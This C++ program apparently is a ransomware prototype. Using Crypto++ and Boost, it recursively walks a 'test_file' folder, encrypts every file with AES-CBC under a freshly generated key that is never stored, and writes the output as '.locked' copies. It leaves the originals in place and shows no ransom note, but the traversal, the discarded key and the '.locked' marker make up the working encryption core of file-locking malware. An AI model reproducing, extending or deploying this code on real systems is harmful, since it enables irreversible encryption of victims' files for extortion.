#include <cryptopp/aes.h>
#include <cryptopp/default.h>
#include <cryptopp/osrng.h>
#include <cryptopp/cryptlib.h>
#include <cryptopp/hex.h>
#include <cryptopp/filters.h>
#include <cryptopp/files.h>
#include <cryptopp/ccm.h>

#include <boost/filesystem/operations.hpp>
#include <iostream>
#include <string>
#include <vector>

using namespace CryptoPP;
using namespace boost::filesystem;
using namespace std;

// #define KEY_LEN 32 // 256 bits
#define KEY_LEN AES::DEFAULT_KEYLENGTH
#define IV_LEN CryptoPP::AES::BLOCKSIZE
#define LOCKED_EXTENSION ".locked"

struct crypt_data {
	unsigned char key[KEY_LEN];
	unsigned char iv[IV_LEN];
};

void encrypt(const crypt_data* data, string path);
crypt_data* generatekey();
void Traversal ( vector<string> & files );

int main()
{
    vector<string> filePaths;
    Traversal(filePaths);
    // encrypt a file
    crypt_data* d = generatekey();
    cout<<"Start encrpt a file...\n";
    for (int i=0; i<filePaths.size(); i++){
        class path encryptFile = filePaths[i];
        cout<<"The file path is : "<<encryptFile.c_str()<<endl;
        encrypt(d, encryptFile.c_str());
    }

    cout<<"Successfully encrypt...";
    return 0;
}


// defination of function used

void encrypt(const crypt_data* d, string path) {
	string cipher;
	string plain;

    // pipeling, change file into string that all data can be pumped at once
	FileSource(path.c_str(), true, new StringSink(plain));

#ifdef DEBUG
	// Print key and initialization vector
	string skey;
	StringSource(d->key, sizeof(d->key), true, new HexEncoder(new StringSink(skey)));
	cout << "Key:\t\t" << skey << endl;
	skey.clear();

	string siv;
	StringSource(d->iv, sizeof(d->iv), true, new HexEncoder(new StringSink(siv)));
	cout << "IV:\t\t" << siv << endl;
	siv.clear();

	cout << "Plaintext:\t" << plain << endl;
#endif

	CBC_Mode<AES>::Encryption e;
	e.SetKeyWithIV(d->key, sizeof(d->key), d->iv);

	StreamTransformationFilter filter(e);
	filter.Put((const unsigned char*) plain.data(), plain.size());
	filter.MessageEnd();

	const size_t ret = filter.MaxRetrievable();
	cipher.resize(ret);
	filter.Get((unsigned char*) cipher.data(), cipher.size());

#ifdef DEBUG
	string ciphertext;
	StringSource(cipher, true, new HexEncoder(new StringSink(ciphertext)));
	cout << "Ciphertext:\t" << ciphertext << endl;
#endif

	ofstream ofile((path + LOCKED_EXTENSION).c_str(), std::ios::binary);
	ofile.write(cipher.c_str(), cipher.length());
	ofile.close();
}

crypt_data* generatekey() {
	crypt_data* d = new crypt_data;

	AutoSeededRandomPool prng;

	prng.GenerateBlock(d->key, sizeof(d->key));
	prng.GenerateBlock(d->iv, sizeof(d->iv));

	return d;
}

string getSuffix(string strPath)
{
    int dotNum = strPath.rfind('.');
    int suffixLen = strPath.length()-dotNum;
    string suffix = strPath.substr(dotNum,suffixLen);
    return suffix;
}

void Traversal ( vector<string> & files )
{
    class path pwd_path = current_path(); 
    cout<< pwd_path<<endl;
	class path test_file_path = pwd_path / "test_file";
	recursive_directory_iterator beg_iter(test_file_path);
	recursive_directory_iterator end_iter;
	cout << "start walking...\n";
	for (; beg_iter != end_iter; ++beg_iter) {
        string strPath = beg_iter->path().string();
		if (is_directory(*beg_iter)) {
			cout<<current_path()<<endl;
            continue;
		}
		else if (getSuffix(strPath) != ".locked")
		{	
            files.push_back(strPath);
			cout<<strPath<<endl;
		}
        cout<<"view file: "<<strPath<<endl;
	}
	cout << "finish walking.\n";
}
